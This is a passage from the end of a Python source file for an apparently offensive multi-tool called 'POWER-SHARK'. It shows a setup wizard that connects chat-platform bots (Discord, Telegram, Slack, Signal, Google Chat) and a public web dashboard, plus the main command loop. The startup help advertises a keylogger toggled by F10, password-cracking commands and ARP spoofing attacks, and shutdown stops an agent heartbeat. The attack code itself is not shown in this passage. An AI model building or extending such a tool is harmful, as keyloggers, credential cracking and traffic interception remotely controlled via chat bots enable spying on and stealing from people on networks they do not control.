                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        setup = input(f"{Colors.WHITE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.WHITE}Enter chat ID: {Colors.RESET}").strip()
            if token:
                self.telegram.save_config(token, chat_id)
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        setup = input(f"{Colors.WHITE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.WHITE}Enter channel ID: {Colors.RESET}").strip()
            if token:
                self.slack.save_config(token, channel)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        setup = input(f"{Colors.WHITE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.WHITE}Enter phone number: {Colors.RESET}").strip()
            if phone:
                self.signal.save_config(phone)
                self.signal.start()
                print(f"{Colors.SUCCESS}✅ Signal bot configured...{Colors.RESET}")
        
        setup = input(f"{Colors.WHITE}Configure Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.WHITE}Enter webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.google_chat.save_config(webhook)
                self.google_chat.start()
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
        
        setup = input(f"{Colors.WHITE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.WHITE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.WHITE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        TerminalAnimation.matrix_rain(1.5)
        TerminalAnimation.pulse_animation("🦈 POWER-SHARK", 1.5)
        self.print_banner()
        self.check_dependencies()
        
        auto_monitor = input(f"\n{Colors.WHITE}Start network monitoring? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.network_monitor.start()
            print(f"{Colors.SUCCESS}✅ Network monitoring started{Colors.RESET}")
        
        setup_platforms = input(f"{Colors.WHITE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.SUCCESS}✅ POWER-SHARK ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.WHITE}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.WHITE}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.WHITE}   🔓 Use 'crack' commands for password cracking{Colors.RESET}")
        print(f"{Colors.WHITE}   🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}")
        print(f"{Colors.WHITE}   📊 Use 'report_generate' to generate PDF reports{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.WHITE}[{Colors.WHITE}{self.session_id}{Colors.WHITE}]{Colors.WHITE} 🦈> {Colors.RESET}"
                command = input(prompt).strip()
                if not command:
                    continue
                if command.lower() in ('exit', 'quit'):
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                result = self.handler.execute(command)
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.network_monitor.stop()
        self.agent.stop_heartbeat()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.WHITE}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.WHITE}💾 Database: {DATABASE_FILE}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.WHITE}🦈 Starting POWER-SHARK...{Colors.RESET}")
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = PowerShark()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
